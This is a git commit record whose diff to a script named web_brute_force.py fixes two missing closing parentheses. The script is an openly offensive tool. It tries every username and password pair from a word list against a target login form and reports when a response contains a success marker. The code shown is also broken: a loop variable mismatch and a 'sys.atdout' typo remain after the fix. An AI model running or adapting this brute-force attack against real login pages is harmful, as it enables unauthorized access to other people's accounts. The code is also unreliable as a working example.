ff48f492045639d81413c11f8b7d46e79676ba22
Liffe <111470998+Liffe93@users.noreply.github.com>
2024-01-25 17:15:57 -0500

    Update web_brute_force.py

--- web_brute_force.py
+++ web_brute_force.py
@@ -12,12 +12,12 @@ for username in usernames:
   with open(passwords, "r") as password_list: 
     for passwords in password_list:
       password = password.strip("\n").encode()
-      sys.stdout.write("[X] Attempting user:password -> {} : {}\r".format(username, password.decode())
+      sys.stdout.write("[X] Attempting user:password -> {} : {}\r".format(username, password.decode()))
       sys.stdout.flush() 
       r = requests.post(target, data={"username": username, "password": password})
       if needle.encode() in r.content: 
         sys.stdout.write("\n")
-        sys.atdout.write("\t[>>>>>] Valid Username and Password! '{}' : '{}'".format(username, password.decode())
+        sys.atdout.write("\t[>>>>>] Valid Username and Password! '{}' : '{}'".format(username, password.decode()))
         sys.exit()
       sys.stdout.flush()
       sys.stdout.write("\n")
